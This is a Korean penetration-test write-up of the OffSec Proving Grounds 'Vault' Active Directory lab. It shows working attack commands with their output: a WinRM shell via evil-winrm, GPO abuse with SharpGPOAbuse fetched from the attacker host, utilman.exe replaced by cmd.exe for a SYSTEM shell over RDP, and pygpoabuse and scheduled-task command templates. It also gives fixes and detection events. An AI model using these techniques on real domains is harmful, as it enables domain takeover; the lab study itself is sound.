SMB    192.168.120.172 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False)
SMB    192.168.120.172 445 DC [+] vault.offsec\anirudh:SecureHM
SMB    192.168.120.172 445 DC [*] Enumerated shares
SMB    192.168.120.172 445 DC Share           Permissions     Remark
SMB    192.168.120.172 445 DC -----           -----------     ------
SMB    192.168.120.172 445 DC ADMIN$          READ            Remote Admin
SMB    192.168.120.172 445 DC C$              READ,WRITE      Default share
SMB    192.168.120.172 445 DC DocumentsShare
SMB    192.168.120.172 445 DC IPC$            READ            Remote IPC
SMB    192.168.120.172 445 DC NETLOGON        READ            Logon server share
SMB    192.168.120.172 445 DC SYSVOL          READ            Logon server share

[+] Port 5985 open. Checking winrm ...
WINRM  192.168.120.172 5985 DC [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:vault.offsec)
WINRM  192.168.120.172 5985 DC [+] vault.offsec\anirudh:SecureHM (Pwn3d!)

[+] Port 3389 open. Checking rdp ...
RDP    192.168.120.172 3389 DC [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC) (domain:vault.offsec) (nla:False)
RDP    192.168.120.172 3389 DC [+] vault.offsec\anirudh:SecureHM

[-] Port 1433 closed/filtered. Skipping mssql

[-] Port 21 closed/filtered. Skipping ftp

[*] All active services checked.
```
— 출처: `파일보관\Pasted image 20260708104729.png`

![[Pasted image 20260708104729.png]]

세 줄이 뒤의 경로를 통째로 결정함:

- **`C$ READ,WRITE` · `ADMIN$ READ`** — 일반 사용자에게 나올 권한이 아님. `Server Operators` 멤버십의 냄새임
- **`nla:False`** — RDP 에 네트워크 수준 인증이 꺼져 있음. utilman 치환 경로가 살아 있다는 뜻임
- **`(Pwn3d!)`** — nxc 의 이 표기는 「인증 성공 + 명령 실행 가능」이지 관리자 확정이 아님. WinRM 은 `Remote Management Users` 만으로도 붙음

**WinRM 셸**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd ..
*Evil-WinRM* PS C:\Users\anirudh> cd desktop
*Evil-WinRM* PS C:\Users\anirudh\desktop> type local.txt
5a3377f8afb97ee39a988c201052df14
```
— 출처: `파일보관\Pasted image 20260708104942.png`

![[Pasted image 20260708104942.png]]

`*Evil-WinRM* PS …>` 프롬프트가 **대화형 셸에서 읽었다는 증거**임. 웹셸로 얻은 플래그는 시험에서 0점이라 이 프롬프트가 곧 채점 근거가 됨([[Butch]]).

**Local.txt value:**
`5a3377f8afb97ee39a988c201052df14`

### Privilege Escalation – GPO GenericWrite 악용 (SharpGPOAbuse)

**Vulnerability Explanation:** 일반 사용자 `anirudh` 에게 `Default Domain Policy` GPO 의 쓰기 권한이 잘못 위임돼 있음.
- BloodHound JSON 대조 결과 이 GPO 에만, 이 계정에만 `GenericWrite`·`WriteOwner`·`WriteDacl` 세 ACE 가 붙어 있음 — 나머지 ACE 는 전부 `Domain Admins`(-512)·`Enterprise Admins`(-519)라는 정상 기본 권한임
- GPO 의 실제 설정은 SYSVOL 의 파일(`GptTmpl.inf` 등)이므로 GPO 쓰기 = **그 GPO 가 적용되는 모든 머신의 보안 정책 쓰기**
- `Default Domain Policy` 는 도메인 루트에 링크돼 **DC 를 포함한 전 머신**에 적용됨 → 로컬 Administrators 에 자신을 심으면 DC 로컬 관리자, 즉 도메인 장악
- 부가로 `anirudh` 가 내장 그룹 **`Server Operators`** 멤버라 `SeBackupPrivilege`·`SeRestorePrivilege` 까지 딸려 옴 — 같은 계정으로 가는 SYSTEM 경로가 셋임

**Vulnerability Fix:**
- `Default Domain Policy`·`Default Domain Controllers Policy` 의 위임 검토. **사람 계정에 GPO 편집 권한을 주지 말 것** — 필요하면 전용 GPO 를 분리해 위임
- `GenericWrite`/`WriteDacl`/`WriteOwner` 가 걸린 principal 정기 감사(BloodHound 로 자가 진단). `inherited=false` 인 ACE 가 오설정 후보임
- `Server Operators` 는 사실상 DC 관리자급임 — 일반 사용자·서비스 계정을 넣지 말 것
- DC 의 RDP 에 NLA 강제. `System32` 접근성 바이너리(`utilman.exe`·`sethc.exe`) 무결성 모니터링
- 탐지 — 이벤트 **5136/5137**(디렉터리 객체 변경)로 GPO `versionNumber` 변경, **4663** 으로 SYSVOL `GptTmpl.inf` 변경. GPO 의 Restricted Groups 변경은 정상 운영에서 극히 드물어 발생 즉시 조사 대상임

**Severity:** Critical — 저권한 도메인 사용자 한 명이 DC 의 로컬 관리자(및 SYSTEM)로 즉시 승격됨

**Steps to reproduce the attack:**
1. `bloodhound-python -u anirudh -p SecureHM -d Vault.offsec -ns <DC-IP> -c All` 로 수집
2. `anirudh` 의 아웃바운드 엣지에서 `GenericWrite on Default Domain Policy` 확인
3. Kali 에서 `SharpGPOAbuse.exe` 를 HTTP 로 제공하고 WinRM 셸에서 `iwr` 로 내려받음
4. `.\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh` 실행
5. `gpupdate /force` 로 정책 새로고침 주기를 즉시 당김
6. `net localgroup administrators` 로 멤버십 반영 확인
7. WinRM 세션을 끊고 재접속해 새 토큰을 받은 뒤 `proof.txt` 읽기

**BloodHound 수집**

```bash
┌──(kali㉿kali)-[~/PG/Vault]
└─$ bloodhound-python -u anirudh -p SecureHM -d Vault.offsec -ns 192.168.120.172 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: vault.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.vault.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.vault.offsec
INFO: Found 5 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.vault.offsec
INFO: Done in 00M 18S
```
— 출처: `파일보관\Pasted image 20260708125002.png`

![[Pasted image 20260708125002.png]]

> [!danger] `Failed to get Kerberos TGT … dc.vault.offsec:88 … Name or service not known` 을 정확히 읽을 것
> **`-ns` 를 줬는데도 Kerberos 가 실패함.** `-ns` 는 **LDAP 조회의 리졸버**만 바꾸고, Kerberos 단계는 **시스템 리졸버**로 `dc.vault.offsec:88` 을 찾음 — Kali 의 `/etc/hosts`·`/etc/resolv.conf` 에 그 이름이 없음.
> 여기서는 NTLM 폴백으로 수집이 성공했음(`Found 5 users` 등). 그러나 **NTLM 이 꺼진 도메인이라면 수집 자체가 실패함.** 그때 필요한 것이 아래 한 줄을 `/etc/hosts` 에 넣는 것임:
> ```text
> 192.168.120.172  DC.vault.offsec  vault.offsec  DC
> ```
> AD 박스에서는 이 등록을 반사적으로 해두는 편이 나음 — 상세는 [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]].

수집 규모가 이 박스의 단순함을 보여줌 — 사용자 5명, 컴퓨터 1대.

```bash
jq -r '.data[].Properties | [.samaccountname,.enabled,.dontreqpreauth] | @tsv' 20260708124927_users.json
		
anirudh	true	false
krbtgt	false	false
Guest	true	false
Administrator	true	false
```
— 출처: `~/PG/Vault/20260708124927_users.json`

활성 계정은 `anirudh`·`Guest`·`Administrator` 셋뿐이고 `krbtgt` 는 비활성임. **피벗할 옆 사용자가 없음** → 남은 것은 anirudh 의 권한으로 곧장 관리자로 올라가는 것뿐임. `dontreqpreauth` 가 전부 `false` 라는 것은 **AS-REP 로스팅 대상이 하나도 없다**는 확정 답이기도 함.

**anirudh 의 그룹 — 특권의 출처**

```bash
jq -r '.data[] | select((.Members//[])[].ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1103")
       | .Properties.name' 20260708124927_groups.json
SERVER OPERATORS@VAULT.OFFSEC
REMOTE MANAGEMENT USERS@VAULT.OFFSEC
```
— 출처: `~/PG/Vault/20260708124927_groups.json`

- **Remote Management Users** — `evil-winrm` 이 붙는 이유임(WinRM 접근권)
- **Server Operators** — DC 에서 서비스 시작·정지, 로컬 로그온, 백업·복원을 할 수 있는 내장 그룹. `whoami /priv` 에 뜨는 `SeBackupPrivilege`·`SeRestorePrivilege`·`SeShutdownPrivilege` 가 전부 여기서 옴

`Server Operators`·`Backup Operators`·`Print Operators` 는 **BloodHound 가 기본으로 "High Value" 로 칠하지 않을 수 있음.** `Domain Admins` 만 빨갛게 보고 넘기면 이 계정이 이미 관리자급이라는 것을 놓침. **사람 계정이 이 세 그룹 중 하나에 있으면 그 자체로 DC 장악 경로임.**

**GPO ACL — 오설정 하나를 기본 권한 더미에서 골라내기**

```bash
jq -r '.data[] | .Properties.name as $n | (.Aces//[])[]
       | select(.PrincipalSID=="S-1-5-21-537427935-490066102-1511301751-1103")
       | [$n,.RightName] | @tsv' 20260708124927_gpos.json
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	GenericWrite
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteOwner
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteDacl
```
— 출처: `~/PG/Vault/20260708124927_gpos.json`

`-1103` 이 anirudh 임(SharpGPOAbuse 출력의 `SID Value of anirudh` 가 같은 SID 를 독립적으로 확인해 줌). 같은 파일에서 GPO 두 개의 쓰기 ACE 를 **전부** 뽑으면 이 위임이 왜 비정상인지가 드러남:

```bash
jq -r '.data[] | .Properties.name as $n | (.Aces//[])[]
       | select(.RightName|test("Write")) | [$n,.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708124927_gpos.json
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN CONTROLLERS POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-512	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-519	Group
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	GenericWrite	S-1-5-21-537427935-490066102-1511301751-1103	User
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteOwner	S-1-5-21-537427935-490066102-1511301751-1103	User
DEFAULT DOMAIN POLICY@VAULT.OFFSEC	WriteDacl	S-1-5-21-537427935-490066102-1511301751-1103	User
```
— 출처: `~/PG/Vault/20260708124927_gpos.json`

`-512` 는 `Domain Admins`, `-519` 는 `Enterprise Admins` 임 — 전부 정상 기본 권한이고 `PrincipalType` 도 `Group` 임. **`PrincipalType` 이 `User` 인 세 줄, 즉 `-1103`(anirudh) 만이 비정상**이고, `Default Domain Controllers Policy` 에는 그 엣지가 없음. 이 박스의 취약점은 **「일반 사용자 한 명에게 도메인 정책 GPO 쓰기 권한을 잘못 위임한 것」 딱 하나**임.

BloodHound 그래프도 같은 세 엣지를 보여줌:

![[Pasted image 20260708131411.png]]

손으로 `nTSecurityDescriptor` 를 파싱하는 것보다 그래프가 훨씬 빠른 이유가 이것임 — **기본 권한 더미 속에서 오설정 하나를 골라내는 작업**이라 사람 눈으로는 못 함. 같은 판단의 일반형은 [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]] · [[_PLAYBOOK#B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다]].

**`WriteOwner`/`WriteDacl` 도 같은 결과로 이어짐 — 단계가 하나 늘 뿐임.** `GenericWrite` 가 없고 `WriteDacl` 만 있었다면 먼저 자신에게 `GenericWrite`(또는 FullControl)를 부여한 뒤 같은 공격을 함. `WriteOwner` 면 소유권을 자신으로 바꾼 뒤 DACL 을 고침. 이 박스는 `GenericWrite` 가 이미 있어 한 단계로 끝났음.

> [!warning] BloodHound 데이터는 수집 시점 스냅샷임
> JSON 파일명 `20260708124927_*` 은 **12:49:27 에 찍은 사진**임. 뒤에서 GPO 를 고쳐 anirudh 를 로컬 관리자에 넣지만 **그 변경은 이 스냅샷에 없음.** 그래서 반영 여부를 그래프가 아니라 `net localgroup administrators`(살아 있는 상태 조회)로 확인했음. **변경을 만든 뒤에는 그래프가 아니라 실물을 볼 것.**

**DCSync 는 왜 아니었나 — 먼저 확인하고 접음**

```bash
jq -r '.data[] | (.Aces//[])[] | select(.RightName|test("GetChanges"))
       | [.RightName,.PrincipalSID,.PrincipalType] | @tsv' 20260708124927_domains.json
GetChanges	S-1-5-21-537427935-490066102-1511301751-498	Group
GetChangesAll	S-1-5-21-537427935-490066102-1511301751-516	Group
GetChangesInFilteredSet	VAULT.OFFSEC-S-1-5-32-544	Group
GetChanges	VAULT.OFFSEC-S-1-5-32-544	Group
GetChangesAll	VAULT.OFFSEC-S-1-5-32-544	Group
GetChangesInFilteredSet	VAULT.OFFSEC-S-1-5-9	Group
GetChanges	VAULT.OFFSEC-S-1-5-9	Group
```
— 출처: `~/PG/Vault/20260708124927_domains.json`

anirudh(`-1103`)도 `Server Operators` 도 도메인 객체에 `GetChanges`/`GetChangesAll` 을 갖고 있지 않음 — `-498`(Enterprise Read-only Domain Controllers) · `-516`(Domain Controllers) · `S-1-5-32-544`(BUILTIN\Administrators) · `S-1-5-9`(Enterprise Domain Controllers)라는 기본 principal 뿐임. **진입 시점에 직접 DCSync 는 불가능함.**

⚠️ 다만 `BUILTIN\Administrators` 가 `GetChanges` 와 `GetChangesAll` 을 **둘 다** 가짐. 즉 GPO 로 로컬 Administrators 에 들어간 뒤에는 DCSync 가 성립할 것으로 읽히나 **이 박스에서 실제로 시도하지는 않았음**(관측 없음).

**「`GetChanges` ACE 가 없다」가 「도메인 해시를 못 얻는다」는 뜻이 아님.** DCSync(DRSUAPI 복제)는 한 가지 방법일 뿐이고, `SeBackupPrivilege` 로 `ntds.dit` 를 직접 읽거나 DC 에서 로컬 관리자·SYSTEM 이 되면 같은 곳에 도달함. **그 자리에서 포기하지 말고 `whoami /priv` 를 먼저 볼 것.**

**SharpGPOAbuse 준비**

```bash
┌──(kali㉿kali)-[~/git]
└─$ git clone https://github.com/byronkg/SharpGPOAbuse.git
Cloning into 'SharpGPOAbuse'...
remote: Enumerating objects: 66, done.
remote: Counting objects: 100% (66/66), done.
remote: Compressing objects: 100% (59/59), done.
remote: Total 66 (delta 9), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (66/66), 765.02 KiB | 9.68 MiB/s, done.
Resolving deltas: 100% (9/9), done.
```
— 출처: `파일보관\Pasted image 20260708131710.png`

![[Pasted image 20260708131710.png]]

byronkg 포크를 쓴 이유는 **컴파일된 `.exe` 를 포함**하기 때문임(원본 FSecureLABS 저장소는 소스만 제공). 실제 파일 위치는 `~/git/SharpGPOAbuse/SharpGPOAbuse-master/SharpGPOAbuse.exe` 임.

**GPO 수정 — 옵션 이름을 두 번 틀림**

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> iwr 192.168.45.175/SharpGPOAbuse.exe -o SharpGPOAbuse.exe
*Evil-WinRM* PS C:\Users\anirudh\desktop> .\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" -- UserAccount anirudh
[!] Unknown argument error.
[!] Exiting...
*Evil-WinRM* PS C:\Users\anirudh\desktop> .\SharpGPOAbuse.exe --AddlocalAdmin --GPO "Default Domain Policy" --UserAccount anirudh
[!] Unknown argument error.
[!] Exiting...
*Evil-WinRM* PS C:\Users\anirudh\desktop> .\SharpGPOAbuse.exe --AddlocalAdmin --GPOName "Default Domain Policy" --UserAccount anirudh
[+] Domain = vault.offsec
[+] Domain Controller = DC.vault.offsec
[+] Distinguished Name = CN=Policies,CN=System,DC=vault,DC=offsec
[+] SID Value of anirudh = S-1-5-21-537427935-490066102-1511301751-1103
[+] GUID of "Default Domain Policy" is: {31B2F340-016D-11D2-945F-00C04FB984F9}
[+] File exists: \\vault.offsec\SysVol\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] The GPO does not specify any group memberships.
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```
— 출처: `파일보관\Pasted image 20260708132007.png`

![[Pasted image 20260708132007.png]]

**옵션은 `--GPO` 가 아니라 `--GPOName` 임.** 첫 시도는 `--GPO` 와 `-- UserAccount`(하이픈 뒤 공백) 두 군데가 틀렸고, 둘째 시도에서 공백만 고쳐 여전히 실패했음. `[!] Unknown argument error.` 는 **어느 인자가 틀렸는지 알려주지 않으므로** 한 번에 하나씩 고치면 왕복이 늘어남 — 세 번째에 `--GPOName` 으로 바꿔 통과했음.

⚠️ 실제로 통과한 문자열은 `--AddlocalAdmin`(l 이 소문자)인데, 상류 저장소 README 의 표기는 `--AddLocalAdmin`(L 이 대문자)임. 표기가 다른데도 실행이 성공했으므로 **이 인자에 한해 파서가 대소문자 차이를 허용함**이 실측으로 확인됨. 문서상의 정식 표기는 `--AddLocalAdmin` 임.

**출력 한 줄씩 읽기**

| 줄 | 의미 |
|---|---|
| `SID Value of anirudh = …-1103` | 추가할 계정의 SID 확정. `GptTmpl.inf` 에는 이름이 아니라 **SID 로 기록**됨 |
| `File exists: …\GptTmpl.inf` | 고칠 보안 템플릿을 SYSVOL 에서 찾음. **이 경로에 쓸 수 있다는 것이 `GenericWrite` 의 실체** |
| `The GPO does not specify any group memberships.` | 원래 이 GPO 에는 그룹 멤버십 설정이 없었음 — 기존 설정을 덮어쓰지 않고 새 섹션을 추가했다는 뜻 |
| `versionNumber attribute changed successfully` | LDAP 쪽 GPC 의 `versionNumber` 를 올림 |
| `The version number in GPT.ini was increased` | SYSVOL 쪽 GPT 의 `GPT.ini` 도 올림 |
| `Wait for the GPO refresh cycle.` | 변경은 다음 정책 새로고침에 반영됨 |

| 조각 | 역할 |
|---|---|
| `--AddlocalAdmin` | 제한된 그룹(Restricted Groups) 방식으로 로컬 Administrators 에 추가 |
| `--GPOName "Default Domain Policy"` | 쓰기 권한을 가진 GPO. **따옴표 필수**(공백 포함) |
| `--UserAccount anirudh` | 관리자로 승격할 계정 = 자기 자신 |

**SharpGPOAbuse 가 SYSVOL 에 실제로 무엇을 쓰는가**

GPO 는 두 곳에 나뉘어 저장됨:

| 저장소 | 위치 | 담는 것 |
|---|---|---|
| **GPC**(Group Policy Container) | LDAP `CN={GUID},CN=Policies,CN=System,DC=vault,DC=offsec` | 메타데이터 — `versionNumber`, 확장 목록 |
| **GPT**(Group Policy Template) | SYSVOL `\\vault.offsec\SysVol\vault.offsec\Policies\{GUID}\` | 실제 설정 파일 — `GPT.ini`, `Machine\…\GptTmpl.inf`, `ScheduledTasks.xml` 등 |

`GenericWrite` 로 고칠 수 있는 것 중 무기가 되는 셋 — **제한된 그룹**(`GptTmpl.inf`, `--AddLocalAdmin` 이 쓰는 것) · **즉시 예약 작업**(`ScheduledTasks.xml`, `--AddComputerTask`) · 로그온/시작 스크립트.

`--AddlocalAdmin` 은 "제한된 그룹" 설정을 `GptTmpl.inf` 에 써넣음. 형식은 개념적으로 아래와 같음 — **이 박스에서 그 파일을 직접 열어본 것은 아니고 Restricted Groups 의 표준 형식임**(관측 없음):

```ini
[Group Membership]
*S-1-5-32-544__Members = *S-1-5-21-537427935-490066102-1511301751-1103
```

`S-1-5-32-544` 가 로컬 Administrators 의 잘 알려진 SID 임. **이름이 아니라 SID 로 기록**되기 때문에 도구가 `SID Value of anirudh` 를 먼저 계산한 것임.

> [!danger] 두 버전 번호가 어긋나면 클라이언트가 정책을 새로 적용하지 않는다
> 클라이언트는 **GPC 와 GPT 의 버전을 비교해** 「정책이 바뀌었는지」를 판단함. 하나만 올리고 다른 하나를 안 올리면 불일치로 무시되거나 오류가 남.
> **손으로 할 때 이 단계를 빠뜨리는 것이 가장 흔한 실패임** — `GptTmpl.inf` 만 고치고 `versionNumber` 를 안 올리면 `gpupdate /force` 를 쳐도 아무 일도 일어나지 않음.

> [!tip] Kali 네이티브 대안 — `pygpoabuse`(업로드 없이)
> SharpGPOAbuse 는 `.exe` 라 타겟에 올려야 하고 그만큼 AV 위험이 있음. `pygpoabuse` 는 Kali 에서 LDAP+SMB 로 SYSVOL 의 `GptTmpl.inf` 를 직접 고치고 버전을 올림 — 업로드가 없어 흔적이 적음.
> ```text
> pygpoabuse.py vault.offsec/anirudh:SecureHM -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net localgroup administrators anirudh /add' -f
> ```
> **이 박스에서는 SharpGPOAbuse 로 풀었고 pygpoabuse 는 실행하지 않았음** — 위 명령줄은 형태만 적은 것임.

> [!tip] `--AddComputerTask` 대안 — 재로그온 없이 즉시 SYSTEM
> `--AddLocalAdmin` 은 계정을 관리자로 만들 뿐이라 **재로그온**이 필요함(토큰에 그룹 반영). 더 빠른 것은 즉시 예약 작업을 심어 SYSTEM 으로 페이로드를 바로 실행하는 것임:
> ```text
> .\SharpGPOAbuse.exe --AddComputerTask --TaskName "x" --Author DC\Administrator --Command "cmd.exe" --Arguments "/c <payload>" --GPOName "Default Domain Policy"
> ```
> **이 박스에서는 `--AddLocalAdmin` 으로 풀었고 위 형태는 실행하지 않았음.**

**정책 새로고침 강제**

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> gpupdate /force
Updating policy...


Computer Policy update has completed successfully.

User Policy update has completed successfully.
```
— 출처: `파일보관\Pasted image 20260708132047.png`

![[Pasted image 20260708132047.png]]

그룹 정책은 기본적으로 **90분(±30분 랜덤)** 마다, DC 는 **5분** 마다 새로고침됨. SYSVOL 파일을 고쳐도 그 주기가 돌아야 로컬 Administrators 에 실제로 반영되고, `gpupdate /force` 가 그 주기를 지금 당장 강제함. `/force` 는 「바뀐 것만」이 아니라 **모든 정책을 다시 적용**함.

이 명령을 칠 수 있는 것은 **이미 DC 위에 셸을 갖고 있기 때문**임. 실제 침투에서 대상이 워크스테이션이면 그 머신에서 주기를 기다리거나 사용자 재로그온을 유도해야 함.

**반영 확인 → 재로그온 → proof.txt**

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
anirudh
The command completed successfully.
```
— 출처: `파일보관\Pasted image 20260708132134.png`

![[Pasted image 20260708132134.png]]

`anirudh` 가 Administrators 에 들어갔음.

> [!warning] 「관리자가 됐는데 파일이 안 읽힌다」 → 재로그온을 안 한 것임
> 그룹 멤버십은 **토큰 발급 시점에 스탬프**됨. `net localgroup` 에 이름이 보여도 현재 세션의 토큰은 옛것이라 접근이 거부됨. **반드시 새 세션을 열 것.** GPO·그룹 기반 권한상승에서 가장 흔한 「왜 안 되지」 지점임.
> ⚠️ 재접속했는데도 `whoami /priv` 가 초라하면 그때는 **다른 원인**임 — UAC 원격 토큰 필터링을 의심할 것.

WinRM 세션을 끊고 다시 붙자 새 토큰에 Administrators 가 들어와 관리자 파일이 읽혔음:

```powershell
*Evil-WinRM* PS C:\Users\administrator> cd desktop
*Evil-WinRM* PS C:\Users\administrator\desktop> type proof.txt
714b4d1566a4bc88b9a0f45c33b36f0b
```
— 출처: `파일보관\Pasted image 20260708132320.png`

![[Pasted image 20260708132320.png]]

#### 경로 B — `SeRestorePrivilege` (utilman 치환 + RDP) · 실제로 완주함

anirudh 의 특권을 보면 GPO 말고도 길이 있음:

```powershell
*Evil-WinRM* PS C:\Users\anirudh\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
— 출처: `파일보관\Pasted image 20260708132526.png`

![[Pasted image 20260708132526.png]]

`SeRestorePrivilege` 가 `Enabled` 임. 이 특권은 복원 목적이라 **DACL 을 무시하고 임의 파일에 쓸 수 있음** — `C:\Windows\System32` 의 접근성 바이너리를 갈아끼우는 고전 경로가 그대로 성립함.

```powershell
*Evil-WinRM* PS C:\Users\anirudh\Documents> cd c:\windows
*Evil-WinRM* PS C:\windows> cd system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
```

`utilman.exe` 는 로그온 화면의 **접근성 버튼(Win+U)** 이 실행하는 바이너리이고, 그 화면에서는 **SYSTEM 으로 뜸.** 그것을 `cmd.exe` 로 바꿔치기하면 로그온 전 화면에서 SYSTEM 셸이 열림. 전제조건은 **RDP 에 NLA 가 꺼져 있는 것**(`nla:False`) — NLA 가 켜져 있으면 로그온 화면에 도달하기 전에 인증을 요구하므로 이 경로가 죽음.

```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /u:anirudh /p:SecureHM /v:192.168.120.172 /cert:ignore /sec:tls
```
— ⚠️ 이 명령줄 자체는 `~/.zsh_history` 에도 산출물에도 없음. **RDP 접속이 실제로 일어난 것은 스크린샷으로 확정되나 플래그 구성은 원본 노트에서 옮긴 재구성임** `[가정]`

RDP 접속 후 **Win+U** 를 누르면 `Utilman.exe`(=cmd.exe)가 SYSTEM 으로 뜸:

![[Pasted image 20260708134045.png]]

창 제목이 `C:\Windows\system32\utilman.exe - .\Utilman.exe` 로 **치환이 실제로 일어났음**을 보여주고, 그 안에서:

```text
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\proof.txt
74a1ddd00c6d187cf4f787c14d5cbde1
```
— 출처: `파일보관\Pasted image 20260708134045.png` (FreeRDP 창 제목이 `FreeRDP: 192.168.120.172`)

같은 화면 위쪽에 `The system cannot find message text for message number 0x2350 in the message file for Application.` 과 `Not enough memory resources are available to process this command.` 가 두 번 찍혀 있음 — 치환 직후 첫 두 실행이 실패했다는 기록임. **원인은 이 박스에서 확인하지 않았음**(관측 없음).

> [!danger] 이 화면의 `proof.txt` 값이 WinRM 경로에서 읽은 값과 «다르다»
> - WinRM(GPO 경로) · 붙여넣기 13:23:20 → `714b4d1566a4bc88b9a0f45c33b36f0b`
> - RDP(utilman 경로) · 붙여넣기 13:40:45 → `74a1ddd00c6d187cf4f787c14d5cbde1`
>
> **두 값 모두 스크린샷으로 확인된 실측이고 한 글자씩 대조했음.** 17분 사이에 값이 바뀌었다는 것은 그 사이에 인스턴스가 재시작·초기화됐다는 뜻이겠으나(PG 는 플래그를 인스턴스마다 재생성함), **그것을 확정할 근거가 이 박스의 산출물에 없음** `[가정]`.
> 실용적 함의 — **플래그는 읽은 «그 순간에» 제출할 것.** 나중에 노트에서 옮겨 적으면 이미 다른 값일 수 있음.

#### 경로 C — `SeBackupPrivilege` (`ntds.dit` → DCSync 동급) · **미실행**

